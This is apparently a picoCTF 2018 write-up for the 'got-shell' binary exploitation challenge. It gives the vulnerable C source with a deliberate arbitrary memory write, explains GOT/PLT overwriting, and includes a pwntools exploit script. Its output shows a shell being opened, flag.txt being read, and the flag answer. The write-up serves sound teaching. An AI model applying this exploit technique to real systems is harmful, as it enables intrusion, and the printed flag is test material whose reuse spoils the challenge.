# got-shell 
Binary Exploitation, 350 points

## Description:
> Can you authenticate to this service and get the flag?

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

void win() {
  system("/bin/sh");
}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[256];
  
  unsigned int address;
  unsigned int value;

  puts("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?");

  scanf("%x", &address);

  sprintf(buf, "Okay, now what value would you like to write to 0x%x", address);
  puts(buf);
  
  scanf("%x", &value);

  sprintf(buf, "Okay, writing 0x%x to 0x%x", value, address);
  puts(buf);

  *(unsigned int *)address = value;

  puts("Okay, exiting now...\n");
  exit(1);
  
}
```

## Solution:

The program kindly allows us to write an arbitrary DWORD to an arbitrary address. With this write, we are supposed to be able to access the flag. Luckily, we have a function (`win()`) that when called, will give us a shell. So, we just need to find a way to call it.

To do that, we'll override the .got.plt entry for `exit` with the address of `win`. Then, when the program wants to call `exit`, it will jump to the the overridden entry and execute `win` instead.

A good explanation about what is the `.got.plt` can be found [here](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html). Quoting from the blog post:
> .got: 
    This is the GOT, or Global Offset Table. This is the actual table of offsets as filled in by the linker for external symbols.

> .plt:
    This is the PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the .got.plt section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to .got.plt yet.)

> .got.plt:
    This is the GOT for the PLT. It contains the target addresses (after they have been looked up) or an address back in the .plt to trigger the lookup. Classically, this data was part of the .got section.



The script:
```python
from pwn import *

PROGRAM = "./auth"

e = ELF(PROGRAM)

r = remote("2018shell3.picoctf.com", 54664)
log.info("Address of 'exit' .got.plt entry: {}".format(hex(e.got['exit'])))
log.info("Address of 'win': {}".format(hex(e.symbols['win'])))
r.sendlineafter("Where would you like to write this 4 byte value?", hex(e.got['exit']))
print r.recvline()
r.sendline(hex(e.symbols['win']))

r.interactive()
```

The output:
```console
root@kali:/media/sf_CTFs/pico/got-shell# python exploit.py
[*] '/media/sf_CTFs/pico/got-shell/auth'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to 2018shell3.picoctf.com on port 54664: Done
[*] Address of 'exit' .got.plt entry: 0x804a014
[*] Address of 'win': 0x804854b


[*] Switching to interactive mode
Okay, now what value would you like to write to 0x804a014
Okay, writing 0x804854b to 0x804a014
Okay, exiting now...

$ ls
auth
auth.c
flag.txt
xinet_startup.sh
$ cat flag.txt
picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_150b198c}
$ exit
timeout: the monitored command dumped core
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to 2018shell3.picoctf.com port 54664
[*] Got EOF while sending in interactive
```

The flag: picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_150b198c}